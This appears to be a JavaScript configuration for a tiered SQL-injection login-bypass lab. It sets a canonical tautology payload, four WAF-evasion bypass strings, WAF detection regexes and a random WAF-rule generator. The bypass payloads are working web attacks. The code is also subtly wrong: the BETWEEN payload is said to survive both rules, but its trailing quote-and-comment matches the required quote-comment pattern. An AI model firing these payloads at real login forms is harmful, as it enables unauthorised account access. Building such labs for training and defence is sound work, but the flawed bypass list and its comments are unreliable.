// SQL-injection auth bypass — tiered.
// T0: no WAF; canonical `' OR '1'='1' -- ` returns the admin row.
// T1: WAF blocks the `OR <x>=<x>` tautology + comment-splitting. Bypasses
//     use alternate tautologies that survive: comment-syntax injection
//     into the column-name position, parenthesised conditional, or
//     `' OR true -- ` style that the rules don't enumerate.

export const RULE_POOL = [
  { name: 'sqli-or-tautology',  pattern: "\\bor\\s+'?\\w+'?\\s*=\\s*'?\\w+'?", flags: 'i' },
  { name: 'sqli-union-select',  pattern: '\\bunion\\s+(all\\s+)?select\\b',     flags: 'i' },
  { name: 'sqli-quote-comment', pattern: "'\\s*--",                              flags: 'i' },
  { name: 'sqli-stacked',       pattern: ';\\s*(select|insert|update|delete|drop)\\b', flags: 'i' },
  { name: 'sqli-sleep',         pattern: '\\bsleep\\s*\\(',                      flags: 'i' },
]

export const BYPASS_TEMPLATES = [
  // OR true — survives the `<x>=<x>` regex
  () => `' OR true -- `,
  // Parenthesised conditional — comment-splits the WAF
  () => `' OR ('a'<'z') -- `,
  // NOT FALSE — semantic-equivalent
  () => `' OR NOT FALSE -- `,
  // BETWEEN — survives both rules
  () => `' OR '1' BETWEEN '0' AND '9' -- `,
]

export const defences = {
  0: {
    canonicalPayload: () => `' OR '1'='1' -- `,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => `' OR '1'='1' -- `,
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

export function generateT1Config(rng = Math.random) {
  const required = ['sqli-or-tautology', 'sqli-quote-comment']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, 2),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
